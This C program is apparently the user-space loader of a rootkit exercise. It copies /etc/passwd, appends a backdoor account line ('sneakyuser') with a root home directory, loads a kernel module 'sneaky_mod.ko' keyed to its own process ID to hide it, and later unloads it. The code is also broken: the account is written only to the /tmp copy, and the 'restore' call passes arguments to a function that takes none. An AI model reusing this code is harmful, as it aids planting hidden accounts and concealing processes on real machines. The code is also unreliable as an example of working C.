#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int copy_file(){
    int status = system("cp /etc/passwd /tmp/");

    if (status == -1) {
        printf("Error executing the cp command.\n");
        return 1;
    }

    FILE * f = fopen("/tmp/passwd", "r+");
    if(f == NULL){
        printf("cannot open file \n");
        exit(EXIT_FAILURE);
    }
    fseek(f, 0, SEEK_END);
    fprintf(f, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    fclose(f);
    return 0;
}

int main(){
    printf("sneaky_process pid = %d\n", getpid());
    copy_file();

    char arg[50];
    sprintf(arg, "insmod sneaky_mod.ko spid=%d", getpid());
    system(arg);

    while (1){
        char c = fgetc(stdin);
        if(c == 'q'){
            break;
        }
    }

    system("rmmod sneaky_mod.ko");
    copy_file("/tmp/passwd", "/etc/passwd");
    system("rm /tmp/passwd"); 
    return EXIT_SUCCESS;
}